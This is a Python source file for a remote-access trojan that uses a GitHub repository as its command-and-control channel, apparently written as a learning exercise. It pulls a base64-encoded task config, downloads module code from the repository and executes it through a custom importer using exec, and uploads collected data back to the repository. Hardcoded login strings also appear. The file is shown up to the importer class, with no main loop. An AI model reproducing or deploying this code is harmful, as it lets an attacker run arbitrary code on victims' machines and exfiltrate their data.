import os
import queue
import threading
import random
import importlib
import time
import sys
import base64
import json


import types


from github3 import login

trojanId = "uniqueId"

trojanConfig = "%s.json" % trojanId
dataPath = "data/%s/" % trojanId
trojanModules = []
configured = False
taskQueue = queue.SimpleQueue()

password = "Whatever my github password is"


# authenticates the user and gets repo and branch objects
def connect_to_github():
    gh = login(username="AlaexanderStocks", password="password")
    repo = gh.repository("AlexanderStocks", "Networking-RemoteTrojanControl")
    branch = repo.branch("master")

    return gh, repo, branch


# grabs files then read contents locally
def get_file_contents(filepath):

    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


# retrieves remote config document from repo
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojanConfig)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task["module"] not in sys.modules:

            exec("import %s" % task["module"])
    return config


# push collected data
def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojanId, random.randint(1000, 100000))
    repo.create_file(remote_path, "Storing module result", base64.b64encode(data))

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                # tells interpreter the module has been found and it can then load it
                return self

        return None

    def load_module(self, name):
        # create a blank module
        module = types.ModuleType(name)
        # put code from module we found into our new blank module
        exec(self.current_module_code, module.__dict__)
        # insert new module into sys.modules so picked up by future import calls
        sys.modules[name] = module

        return module


